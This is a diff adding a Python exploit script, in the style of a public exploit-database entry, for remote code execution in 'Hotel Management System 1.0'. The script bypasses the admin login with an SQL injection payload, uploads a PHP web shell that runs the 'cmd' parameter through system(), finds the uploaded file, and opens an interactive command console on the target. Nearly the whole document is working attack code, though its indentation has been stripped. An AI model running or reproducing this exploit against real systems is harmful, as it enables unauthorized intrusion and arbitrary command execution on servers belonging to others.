@@ -1,0 +1,116 @@
+# Exploit Title: Hotel Management System 1.0 - Remote Code Execution (Authenticated)
+# Google Dork: N/A
+# Date: 2020-09-23
+# Exploit Author: Eren Şimşek
+# Vendor Homepage: https://www.sourcecodester.com/php/14458/hotel-management-system-project-using-phpmysql.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hotel-management-system-using-php.zip
+# Version: 1.0
+# Tested on: Windows/Linux - XAMPP Server
+# CVE : N/A
+
+# Setup: pip3 install bs4 .
+
+# Exploit Code :
+
+import requests,sys,string,random
+from bs4 import BeautifulSoup
+
+def get_random_string(length):
+letters = string.ascii_lowercase
+result_str = ''.join(random.choice(letters) for i in range(length))
+return result_str
+
+session = requests.session()
+Domain = ""
+RandomFileName = get_random_string(5)+".php"
+def Help():
+print("[?] Usage: python AporlorRCE.py <Domain>")
+
+def Upload():
+burp0_url = Domain+"/admin/ajax.php?action=save_category"
+burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0)
+Gecko/20100101 Firefox/68.0", "Accept": "*/*", "Accept-Language":
+"tr,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "
+http://192.168.1.104/admin/index.php?page=categories", "X-Requested-With":
+"XMLHttpRequest", "Content-Type": "multipart/form-data;
+boundary=---------------------------11915271121184037197158049421",
+"Connection": "close"}
+burp0_data = "-----------------------------11915271121184037197158049421\r\nContent-Disposition:
+form-data; name=\"id\"\r\n\r\n\r\n
+-----------------------------11915271121184037197158049421\r\nContent-Disposition:
+form-data; name=\"name\"\r\n\r\n1\r\n
+-----------------------------11915271121184037197158049421\r\nContent-Disposition:
+form-data; name=\"price\"\r\n\r\n1\r\n
+-----------------------------11915271121184037197158049421\r\nContent-Disposition:
+form-data; name=\"img\"; filename=\""+RandomFileName+"\"\r\nContent-Type:
+application/x-php\r\n\r\n<?php system($_GET['cmd']); ?>\n\r\n
+-----------------------------11915271121184037197158049421--\r\n"
+try:
+Resp = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
+if Resp.text == "1":
+print("[+] Shell Upload Success")
+else:
+print("[-] Shell Upload Failed")
+except:
+print("[-] Request Failed")
+Help()
+
+def Login():
+burp0_url = Domain+"/admin/ajax.php?action=login"
+burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0)
+Gecko/20100101 Firefox/68.0", "Accept": "*/*", "Accept-Language":
+"tr,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "
+http://localhost/fos/admin/login.php", "Content-Type":
+"application/x-www-form-urlencoded;
+charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Connection": "close"}
+burp0_data = {"username": "' OR 1=1 #", "password": "' OR 1=1 #"}
+try:
+Resp = session.post(burp0_url, headers=burp0_headers,data=burp0_data)
+if Resp.text == "1":
+print("[+] Login Success")
+else:
+print("[+] Login Failed")
+except:
+print("[-] Request Failed")
+Help()
+
+def FoundMyRCE():
+global FileName
+burp0_url = Domain+"/admin/index.php?page=categories"
+burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0)
+Gecko/20100101 Firefox/68.0", "Accept":
+"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+"Accept-Language": "tr,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip,
+deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+try:
+Resp = session.get(burp0_url, headers=burp0_headers)
+Soup = BeautifulSoup(Resp.text, "html5lib")
+Data = Soup.find_all("img")
+for MyRCE in Data:
+if RandomFileName in MyRCE["src"]:
+FileName = MyRCE["src"].strip("../assets/img/")
+print("[+] Found File Name: " + MyRCE["src"].strip("../assets/img/"))
+except:
+print("[-] Request Failed")
+Help()
+
+def Terminal():
+while True:
+Command = input("Console: ")
+burp0_url = Domain+"/assets/img/"+FileName+"?cmd="+Command
+try:
+Resp = session.get(burp0_url)
+print(Resp.text)
+except KeyboardInterrupt:
+print("[+] KeyboardInterrupt Stop, Thanks For Use Aporlorxl23")
+except:
+print("[-] Request Error")
+if __name__ == "__main__":
+if len(sys.argv) == 2:
+Domain = sys.argv[1]
+Login()
+Upload()
+FoundMyRCE()
+Terminal()
+else:
+Help()
